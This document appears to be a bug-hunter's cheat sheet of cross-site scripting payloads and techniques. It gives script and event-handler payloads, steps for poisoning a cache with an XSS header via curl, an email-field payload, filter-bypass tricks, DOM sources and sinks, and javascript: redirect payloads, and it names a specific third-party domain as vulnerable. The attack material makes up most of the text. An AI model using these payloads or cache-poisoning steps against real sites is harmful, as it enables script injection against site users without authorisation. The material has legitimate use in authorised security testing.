# xss

Payloads: 

**Basic payload 
**<script>alert(1)</script>
<img src=x onerror=confirm(1)>
**Request header: 
**
1. Capture Request.
2.  Change request header to post 
3. Referer: https://google.com/? (check response for reflection)
4. https://google.com/?q=xss (check for balance and reflection of parameter xss)

**XSS on useragent  and chaching
**

1.curl "target.com/parameter.php?xss" -I 
2.Note : cahce:HIT (request coming from cache) cache:MISS (request not  coming for cache)
3.curl "target.com/parameter.php?xss" -I -H "xss:<svg onload=alert(1)>
4. Check if cahe got hit.
5. Change the endpoint curl "target.com/parameter.php?xss1" -I -H "xss:<svg onload=alert(1)>
6. run curl "target.com/parameter.php?xss1"      (check response for xss <svg header )
7. visit target.com/parameter.php?xss1 in browser !! BOOM XSS !!
                                                                              
**XSS on email login field                                                                               
**
Email address validator:
http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate
avanthi.edu.in = vulnerable
Payload = "><svg/onload=confirm(1)>"@x.y
                                                                              
                                                                                                                                                        
 **XSS using url encoding and base 64 encoding** = encode the payload 
 
**  Note : If script , img , " , encoding is blocked use :                                                                            
** '-confirm(xss)-'
                                                      
**Blind XSS 
**                                                                              
 Try on feedback or chat bot   
 
**Stored XSS
**
 
edit profile, chatbots, anything that'e getting stored. 
 
**XSS DOM  
**
 Source List : 
document.URL
document.referrer
location.href
location.hash
location.search
location.pathname 
 
 Sink list: 
 eval 
 setTimeout
 setInterval
 document.write
 elements.innerHTML
 
 payload for redirect parameter = javascript:alert(1)
 index=alert(1)
 
 DOM XSS SCANNER : https://github.com/dwisiswant0/findom-xss.git
  
  
** Onmouseover payload** : <a href="javascript:alert(1)" onmouseover=alert(1)>hovermeplz</a>
 
 
